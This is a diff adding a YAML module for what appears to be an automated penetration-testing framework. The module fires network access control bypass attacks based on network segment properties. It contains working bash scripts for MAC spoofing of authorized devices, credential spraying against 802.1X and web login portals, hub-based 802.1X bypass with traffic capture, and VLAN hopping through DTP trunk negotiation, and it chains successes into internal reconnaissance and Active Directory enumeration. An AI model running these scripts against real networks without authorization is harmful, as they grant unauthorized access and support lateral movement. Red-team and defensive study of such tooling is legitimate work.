@@ -1,0 +1,345 @@
+id: property_based_nac_bypass
+name: NAC Bypass (Property-Based)
+category: NAC Bypass
+priority: critical
+description: Automatically attempt NAC bypass based on network segment properties
+detailed_description: |
+  When a network segment has NAC enabled, automatically trigger appropriate bypass
+  techniques based on available resources (credentials, authorized MACs, etc.).
+
+# Asset property-based triggers
+asset_triggers:
+  # NAC present with no credentials - try MAC spoofing
+  - asset_type: network_segment
+    conditions:
+      all:
+        - property: nac_enabled
+          operator: equals
+          value: true
+        - property: access_level
+          operator: in_list
+          values: ["blocked", "limited"]
+        - property: credentials_available
+          operator: not_exists
+        - property: authorized_macs_discovered
+          operator: exists
+    priority: 95
+    deduplication_key: "{asset.id}:nac_mac_spoof:{authorized_macs.hash}"
+    trigger_name: "MAC Spoofing NAC Bypass"
+
+  # NAC present with credentials - try credential auth
+  - asset_type: network_segment
+    conditions:
+      all:
+        - property: nac_enabled
+          operator: equals
+          value: true
+        - property: access_level
+          operator: in_list
+          values: ["blocked", "limited"]
+        - property: credentials_available
+          operator: exists
+        - property: nac_type
+          operator: in_list
+          values: ["802.1x", "web_auth"]
+    priority: 98
+    deduplication_key: "{asset.id}:nac_cred_auth:{credentials.hash}"
+    trigger_name: "NAC Credential Authentication"
+
+  # 802.1X detected - try hub/tap bypass
+  - asset_type: network_segment
+    conditions:
+      all:
+        - property: nac_type
+          operator: equals
+          value: "802.1x"
+        - property: authenticated_device_present
+          operator: equals
+          value: true
+        - property: physical_access
+          operator: equals
+          value: true
+    priority: 85
+    deduplication_key: "{asset.id}:8021x_hub_bypass"
+    trigger_name: "802.1X Hub/Tap Bypass"
+
+  # VLAN segmentation - try VLAN hopping
+  - asset_type: network_segment
+    conditions:
+      all:
+        - property: vlan_segmentation
+          operator: equals
+          value: true
+        - property: access_level
+          operator: equals
+          value: "limited"
+        - property: vlans_discovered
+          operator: greater_than
+          value: 1
+    priority: 80
+    deduplication_key: "{asset.id}:vlan_hopping:{vlans.hash}"
+    trigger_name: "VLAN Hopping Attack"
+
+# Variables extraction
+variables:
+  interface_name:
+    source: network_interface
+    default: "eth0"
+
+  gateway:
+    source: gateway
+    default: "{subnet}.1"
+
+  authorized_macs:
+    source: authorized_macs_discovered
+    transform: "authorized_macs_discovered.join(' ')"
+
+  target_mac:
+    source: authorized_macs_discovered
+    transform: "authorized_macs_discovered[0]"  # Use first discovered MAC
+
+  credentials:
+    source: credentials_available
+    transform: |
+      credentials_available.map(c =>
+        `${c.username}:${c.password || c.hash}`
+      )
+
+  vlan_ids:
+    source: vlans_discovered
+    transform: "vlans_discovered.map(v => v.id).join(',')"
+
+# Commands based on trigger type
+command_variants:
+  mac_spoofing:
+    description: "Attempt NAC bypass via MAC address spoofing"
+    command: |
+      #!/bin/bash
+      echo "[*] Starting MAC spoofing NAC bypass"
+      INTERFACE="{interface_name}"
+      TARGET_MAC="{target_mac}"
+
+      # Save original MAC
+      ORIGINAL_MAC=$(ip link show $INTERFACE | grep ether | awk '{print $2}')
+      echo "[+] Original MAC: $ORIGINAL_MAC"
+
+      # Bring interface down
+      sudo ip link set dev $INTERFACE down
+
+      # Spoof MAC address
+      echo "[+] Spoofing MAC to: $TARGET_MAC"
+      sudo ip link set dev $INTERFACE address $TARGET_MAC
+
+      # Bring interface up
+      sudo ip link set dev $INTERFACE up
+
+      # Request DHCP
+      echo "[+] Requesting DHCP with spoofed MAC"
+      sudo dhclient -r $INTERFACE
+      sudo dhclient -v $INTERFACE
+
+      # Check access level
+      sleep 5
+      ping -c 3 {gateway} && echo "[+] Gateway accessible - NAC bypass successful!"
+
+      # Test internal access
+      nmap -sn {subnet}/24 | grep "Host is up" | wc -l
+
+  credential_auth:
+    description: "Attempt NAC authentication with credentials"
+    command: |
+      #!/bin/bash
+      echo "[*] Starting NAC credential authentication"
+
+      # For 802.1x
+      if [ "{nac_type}" = "802.1x" ]; then
+        cat > /tmp/wpa_supplicant.conf << EOF
+        network={{
+          ssid="{network_name}"
+          key_mgmt=WPA-EAP
+          eap=PEAP
+          identity="{username}"
+          password="{password}"
+          phase2="autheap=MSCHAPV2"
+        }}
+        EOF
+
+        sudo wpa_supplicant -B -i {interface_name} -c /tmp/wpa_supplicant.conf
+        sudo dhclient {interface_name}
+      fi
+
+      # For web auth portal
+      if [ "{nac_type}" = "web_auth" ]; then
+        # Get portal URL
+        PORTAL_URL=$(curl -I http://{gateway} 2>/dev/null | grep Location | cut -d' ' -f2)
+
+        # Attempt authentication
+        for cred in {credentials}; do
+          USER=$(echo $cred | cut -d: -f1)
+          PASS=$(echo $cred | cut -d: -f2)
+
+          echo "[+] Testing $USER"
+          RESULT=$(curl -X POST "$PORTAL_URL/login" \
+            -d "username=$USER&password=$PASS" \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            -s -o /dev/null -w "%{http_code}")
+
+          if [ "$RESULT" = "302" ] || [ "$RESULT" = "200" ]; then
+            echo "[+] Authentication successful with $USER"
+            break
+          fi
+        done
+      fi
+
+  hub_bypass:
+    description: "Bypass 802.1X using network hub/tap"
+    command: |
+      #!/bin/bash
+      echo "[*] Setting up 802.1X hub bypass"
+      echo "[!] Ensure hub is physically connected between authenticated device and wall port"
+
+      # Set interface to promiscuous mode
+      sudo ip link set {interface_name} promisc on
+
+      # Monitor traffic
+      echo "[+] Monitoring traffic for VLAN tags and network config"
+      sudo tcpdump -i {interface_name} -nn -c 1000 -w /tmp/8021x_capture.pcap &
+
+      sleep 30
+
+      # Analyze capture for VLAN info
+      VLAN_ID=$(tcpdump -r /tmp/8021x_capture.pcap -nn vlan 2>/dev/null | \
+        grep -oP 'vlan \K[0-9]+' | head -1)
+
+      if [ -n "$VLAN_ID" ]; then
+        echo "[+] VLAN $VLAN_ID detected"
+        sudo modprobe 8021q
+        sudo vconfig add {interface_name} $VLAN_ID
+        sudo ifconfig {interface_name}.$VLAN_ID up
+        sudo dhclient {interface_name}.$VLAN_ID
+      else
+        # Try without VLAN
+        sudo dhclient {interface_name}
+      fi
+
+  vlan_hopping:
+    description: "Attempt VLAN hopping attack"
+    command: |
+      #!/bin/bash
+      echo "[*] Starting VLAN hopping attack"
+
+      # Try DTP to negotiate trunk
+      echo "[+] Attempting DTP trunk negotiation"
+      sudo yersinia dtp -attack 1 -interface {interface_name} &
+      DTP_PID=$!
+
+      sleep 10
+
+      # Load 802.1Q module
+      sudo modprobe 8021q
+
+      # Try each discovered VLAN
+      for VLAN in {vlan_ids}; do
+        echo "[+] Testing VLAN $VLAN"
+        sudo vconfig add {interface_name} $VLAN 2>/dev/null
+        sudo ifconfig {interface_name}.$VLAN up
+        sudo timeout 10 dhclient {interface_name}.$VLAN
+
+        # Check if we got an IP
+        IP=$(ip addr show {interface_name}.$VLAN | grep inet | awk '{print $2}')
+        if [ -n "$IP" ]; then
+          echo "[+] Success! Got IP $IP on VLAN $VLAN"
+          # Scan new network
+          nmap -sn $(echo $IP | cut -d/ -f1 | cut -d. -f1-3).0/24
+        fi
+      done
+
+      # Cleanup DTP
+      kill $DTP_PID 2>/dev/null
+
+# Property updates on success
+property_updates:
+  on_success:
+    - property: access_level
+      operation: set
+      value: "partial"  # Or "full" depending on result
+
+    - property: bypass_methods_successful
+      operation: append
+      value: "{trigger_name}"
+
+    - property: nac_bypassed
+      operation: set
+      value: true
+
+    - property: bypass_timestamp
+      operation: set
+      value: "{timestamp}"
+
+    - property: internal_subnet_discovered
+      operation: set
+      value: "{discovered_subnet}"
+      condition: subnet_discovered
+
+  on_failure:
+    - property: bypass_methods_attempted
+      operation: append
+      value: "{trigger_name}"
+
+    - property: nac_bypass_failed
+      operation: set
+      value: true
+
+# Chain triggers on successful bypass
+chain_triggers:
+  on_success:
+    - condition:
+        property: access_level
+        operator: in_list
+        values: ["partial", "full"]
+      trigger: network_discovery
+
+    - condition:
+        property: internal_subnet_discovered
+        operator: exists
+      trigger: internal_reconnaissance
+
+    - condition:
+        property: domain_controller_accessible
+        operator: equals
+        value: true
+      trigger: active_directory_enumeration
+
+# Outcome analysis
+outcome_analysis:
+  success_indicators:
+    - IP address obtained
+    - Gateway responds to ping
+    - Internal hosts discovered
+    - DNS resolution working
+
+  failure_indicators:
+    - No DHCP response
+    - Port security violation
+    - 802.1X certificate required
+    - MAC filtering in addition to NAC
+
+# Cleanup
+cleanup:
+  - priority: critical
+    action: Restore original MAC
+    command: |
+      sudo ip link set dev {interface_name} down
+      sudo macchanger -p {interface_name}
+      sudo ip link set dev {interface_name} up
+
+  - priority: high
+    action: Remove VLAN interfaces
+    command: |
+      for vlan in $(ls /proc/net/vlan/ | grep {interface_name}); do
+        sudo vconfig rem $vlan
+      done
+
+  - priority: medium
+    action: Clean up config files
+    command: rm -f /tmp/wpa_supplicant.conf /tmp/8021x_capture.pcap
